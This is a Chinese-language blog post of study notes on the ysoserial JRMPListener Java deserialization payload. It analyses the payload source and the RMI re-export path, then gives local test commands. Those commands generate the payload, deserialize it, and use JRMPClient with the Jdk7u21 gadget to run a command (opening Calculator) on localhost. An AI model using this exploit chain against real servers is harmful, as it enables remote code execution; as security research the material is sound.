---
title: "Java 反序列化 ysoserial JRMPListener"
layout: post
date: 2019-04-20 16:20
headerImage: false
tag:
- Java
- ysoserial
- 反序列化
blog: true
star: false
author: b1ngz
description: Java ysoserial JRMPListener Note
---

# 0x01 简介

Java 反序列化 ysoserial [JRMPListener](<https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPListener.java>) payload 学习笔记

JRMP (Java Remote Method Protocol) 是 Java 实现 RMI 的专有协议，关于 RMI 可以参考  [Java RMI 笔记](<https://b1ngz.github.io/java-rmi>)，有助于理解 `JRMPListener` 的利用过程

# 0x02 分析

`JRMPListener` payload 执行完成后，会在目标机器上的指定端口开启基于 JRMP 协议的 RMI server，我们需要再使用 `exploit/JRMPClient` 请求开启的 RMI server，发送指定的 gadget 来完成利用，具体步骤见 [本地测试](#本地测试) 部分

来看一下 `payloads/JRMPListener` 代码

```java
    public UnicastRemoteObject getObject ( final String command ) throws Exception {
        int jrmpPort = Integer.parseInt(command);
        UnicastRemoteObject uro = Reflections.createWithConstructor(ActivationGroupImpl.class, RemoteObject.class, new Class[] {
            RemoteRef.class
        }, new Object[] {
            new UnicastServerRef(jrmpPort)
        });

        Reflections.getField(UnicastRemoteObject.class, "port").set(uro, jrmpPort);
        return uro;
    }
```

`command` 参数为 RMI server 监听端口

```java
        UnicastRemoteObject uro = Reflections.createWithConstructor(ActivationGroupImpl.class, RemoteObject.class, new Class[] {
            RemoteRef.class
        }, new Object[] {
            new UnicastServerRef(jrmpPort)
        });
```

使用父类  `RemoteObject` 的构造方法 `protected RemoteObject(RemoteRef newref)`，反射创建 `ActivationGroupImpl` 类的实例， 参数为 `UnicastServerRef` 的实例，用于指定 RMI server 监听端口，最后赋值的变量类型为 `UnicastRemoteObject`，其继承关系如下

![image-20190418182428412](/assets/images/ysoserial/UnicastRemoteObject.png)



再来看一下反序列化的过程，`ActivationGroupImpl` 类没有重写 `readObject` 方法，实际调用的是 `UnicastRemoteObject` 

```java
    private void readObject(java.io.ObjectInputStream in)
        throws java.io.IOException, java.lang.ClassNotFoundException
    {
        in.defaultReadObject();
        reexport();
    }
```

内部调用 `reexport()`

```java
    private void reexport() throws RemoteException
    {
        if (csf == null && ssf == null) {
            exportObject((Remote) this, port);
        } else {
            exportObject((Remote) this, port, csf, ssf);
        }
    }
```

这里 `csf` 和 `ssf` 变量都为 null，调用 `exportObject(Remote obj, int port)` 方法

```java
    public static Remote exportObject(Remote obj, int port)
        throws RemoteException
    {
        return exportObject(obj, new UnicastServerRef(port));
    }
```

可以看到，这里开启了 RMI server，将自身 export 了出去，剩余的部分就是 RMI server 创建的内部过程，本地 debug 时的调用栈如下

![image-20190418184254070](/assets/images/ysoserial/jrmp_listener_callstack.png)



# 0x03 本地测试

生成 JRMPListener payload class 文件，指定运行端口为 38471

```shell
mkdir /tmp/ysoserial/
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPListener 38471 > /tmp/ysoserial/jrmplistener.class
```

**这里要注意，以下代码运行后会在本机开启一个存在反序列化漏洞的 RMI server，要注意测试的环境**

```java
    @Test
    public void testJRMPListener() throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(new File("/tmp/ysoserial/jrmplistener.class")));
        ois.readObject();
        // 因为反序列过程中，是创建一个线程来启动 RMI server，需要保证 main thread 不退出
        while (true) {
            System.out.println(System.currentTimeMillis());
            Thread.sleep(3000);
        }
    }
```

使用 `ysoserial.exploit.JRMPClient` 请求 RMI server ，这里为了简单，项目 JDK 使用 7u21，因此直接使用 Jdk7u21 gadget

```shell
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPClient 127.0.0.1 38471 Jdk7u21 "open /Applications/Calculator.app"
```

运行完后会弹出计算器



## 参考

- [ysoserial JRMP相关模块分析（一）- payloads/JRMPListener ](<https://xz.aliyun.com/t/2649>)







